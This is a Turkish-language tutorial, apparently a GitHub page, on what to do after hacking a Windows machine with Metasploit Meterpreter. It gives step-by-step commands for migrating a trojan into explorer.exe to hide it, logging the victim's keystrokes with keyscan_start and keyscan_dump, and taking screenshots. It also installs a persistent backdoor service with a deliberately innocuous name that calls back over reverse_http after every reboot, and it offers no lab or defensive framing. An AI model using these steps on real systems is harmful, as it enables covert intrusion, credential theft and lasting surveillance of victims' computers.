
![resim](https://user-images.githubusercontent.com/18248422/175042903-d4c38166-dd6d-4ce5-ae28-71904fc1ad94.png)

## Bağlantı (hack) sonrası yapılacaklar

### Migrate (işlem göçü)

  migrate bizim backdoor olarak oluşturduğumuz ve halihazırda çalışan trojanımızı, çalışan başka bir exe içine gömerek trojanımızın gizlenmesini sağlayan bir yöntemdir. Şimdi sızmış olduğumuz bir windows cihazda “ps” komutu ile çalışan programladı listeleyelim;

![resim](https://user-images.githubusercontent.com/18248422/175042942-7016745a-5a74-40e3-b23b-904ac2cb9f8e.png)

 Burada da görüldüğü gibi “PID” yani ilk sütunda olan process id kısmını kullanarak kendi trojanımızı migrate edebileceğiz. 
 Şimdi windows da dosya sistemini görüntülemeye yarayan “explorer.exe” nin PID sini kullanarak migrate yapacağız.

![resim](https://user-images.githubusercontent.com/18248422/175042998-9d824e4a-97d5-47af-8a4a-b456daac5eae.png)

burada ki “2824” “explorer.exe” nin PID si idi ve “migrate 2824” yazıp trojanımızı migrate ettik.

NOT: “migrate” işlemi hacklenen bir cihazda ilk yapılması gerekilen işlemlerden biridir!

### Meterpreter ile Keylogger(keystroke) çalıştırmak

Keylogger yani klavyeden girilen değerleri dinlemek için aşağıda ki komutu kullanarak başlatabiliriz;

![resim](https://user-images.githubusercontent.com/18248422/175043272-49faf1ae-436b-4e85-8fa5-031789ebe777.png)
"keyscan_start" komutu ile keystroke sniffer yani klayvede basılan tuşları takip etmeye başladık. Eğer bu komuttan sonra basılan bütün klayve tuşlarını yani yazılanları görmek istiyorsak aşağıda ki komutu kullanıyoruz;

![resim](https://user-images.githubusercontent.com/18248422/175043298-8c3a2def-1649-4512-a358-9ca72e1bc02c.png)

"keyscan_start" komutu ile başlattıktan sonra hacklenen makinede basılan tüm klavye tuşlarını görmek için resimde de gördüğümüz üzere  “keyscan_dump” yazmamız yeterli.

### Screenshot almak

"screenshot" komutunu yazmamız yeterli.

### Hacklenen Cihazda Kalıcı Hale Gelmek

 Öncelikle hacklediğimiz cihazda açmış olduğumuz session menüsünden bir önceki menüye  “background” komutu ile dönüyoruz.  Geri dönmemizin nedeni payload değiştirecek olmamız, çünkü farklı bir payload kullanacağız.
![resim](https://user-images.githubusercontent.com/18248422/175043511-61ebdfb5-dff8-4650-aad3-a1b1f1920b9e.png)

  Yukarıda da görüldüğü gibi “use exploit/windows/local/persistence” persistence yani türkçe manası ile süreklilik, kalıcılık payload'ını kullanmaya ("use") başlıyoruz. Bu payload bizim trojanımızı bu cihaza service olarak enjekte etmemize yarıyor. Bu sayede hacklenen cihaz bilgisayarını her açıp internete bağlandığında cihaza yeniden erişim sağlayabileceğiz, hatta trojan bulunan exe dosyasını silse bile! Çünkü trojanımızı pc her açıldığında çalışacak şekilde bir service içine enjekte ediyoruz. Böylelikle bu cihazda kalıcı hale gelmiş oluyoruz. 

 Şimdi persistence payload'ının options kısmında bazı değişiklikler yapalım;
 
 ![resim](https://user-images.githubusercontent.com/18248422/175043557-203c8969-609c-4195-af9f-d5bc65482135.png)
 
  "set EXE_NAME winexplore.exe" diyerek “winexplore.exe” adında bir service içine trojanımızı enjekte edeceğimizi ayarladık. Burada ki  “winexplore.exe” adını biz verdik, yani herhangi bir isim verebiliriz. Dikkat çekmesin diye  “winexplore.exe” dedik.
 
 Ardından hangi session için bunu yapmak istediğimizi seçiyoruz (o an hangi session da karşı makinaya bağlıysak onun ID'si);
 ![resim](https://user-images.githubusercontent.com/18248422/175043621-41c698e2-bced-43ec-b515-98d27296ac69.png)

 "set SESSION 1" diyerek session kısmını da belirledik.
 
 Eğer istersek custom olarak kendi cihazımızda bulunan kendi oluşturduğumuz trojanı kullanmak istiyorsak bir değişiklik yapmamız gerekir. Bunun için “show advanced” komutu ile aşağıda ki kısmı açıyoruz;
 ![resim](https://user-images.githubusercontent.com/18248422/175043651-f60b8d43-9b08-4a99-9cfc-5b29f1bb3dc9.png)

 ardından yukarıda ki resimde görüldüğü gibi “set EXE::Custom” komutunu kullanıp arından /var/www/html/bacdoors.... (kendi cihazımızda trojanı nereye koyduysak .exe uzantısına kadar yazıyoruz) şeklinde trojanın yerini belirtiyoruz.
 NOT: Bunu yapmakta ki amacımız; eğer bunu yapmazsak sistem kendi oluşturduğu bir default trojan ekler, bizim trojanımızı değil.
 
 Ayarı kontrol etmek için tekrar “show advanced” diyoruz ve;
 
 ![resim](https://user-images.githubusercontent.com/18248422/175043692-37626624-1781-432f-a1ff-dd17af77085b.png)

 
 EXE::Custom kısmında gördüğümüz gibi ayarımız geçerli olmuş.
 
 Artık enjekte etmeye hazırız ve “exploit” komutu ile enjekte etmeyi başlatabiliriz;
 ![resim](https://user-images.githubusercontent.com/18248422/175043740-ce51fa99-ac9f-421f-89ad-55e09b92ed2b.png)

 "exploit" komutu sonrası bu şekilde bir ekran gelirse başarılı olmuş demektir. 
 
 
 Bundan sonra artık hangi yöntem ile hacklediysek eriştiysek ona dönebiliriz;
 ![resim](https://user-images.githubusercontent.com/18248422/175043758-8dd47976-c22b-4a92-9fc0-eb5b98fc4b8b.png)

  burda “reverse_http” kullanılmış o yüzden “use exploit/multi/handler” diyip “set PAYLOAD windows/meterpreter/reverse_http” diyip hacklediğimiz payload'a geri dönüyoruz. 
 
  Artık bundan sonra nasılsa önceden exploit ettik üstüne birde persistence kullanarak cihazda kalıcı hale geldiğimize göre, cihaz kapanıp açılsa bile açıldıktan ve internete bağlandıktan 10 saniye sonra (default olarak 10 saniye belirlenmişti istersek onu da değiştirebiliyoruz) reverse_http yöntemi ile oluşturduğumuz trojanımızı, ismini kendimiz belirlediğimiz ve içine kendi trojanımızı enjekte ettiğimiz ("persistence" payloadı ile) bir service (service adına "winexplore.exe" demiştik) sayesinde bizim cihazımıza bağlanacak. 
  
  kaynak: https://null-byte.wonderhowto.com/how-to/exploit-eternalblue-windows-server-with-metasploit-0195413/
  
  ![resim](https://user-images.githubusercontent.com/18248422/175043850-63f30f8e-9c7d-49c6-8f30-cbfc50c4bb66.png)
  ![resim](https://user-images.githubusercontent.com/18248422/175043879-23c6b837-c028-4634-8904-e2a9c67a0492.png)
  ![resim](https://user-images.githubusercontent.com/18248422/175043903-0fd8a40c-82a8-4511-9565-cca5396bfb42.png)
  ![resim](https://user-images.githubusercontent.com/18248422/175043922-eb075f16-ad88-462e-af7c-12fb41180ae5.png)
  ![resim](https://user-images.githubusercontent.com/18248422/175043959-4fc27dcc-7210-403a-9519-dbdd117b98ca.png)
  ![resim](https://user-images.githubusercontent.com/18248422/175043986-c0f65737-8802-4695-807c-b49e2290678e.png)





  
  
  
  
  
  
  
  
  
 
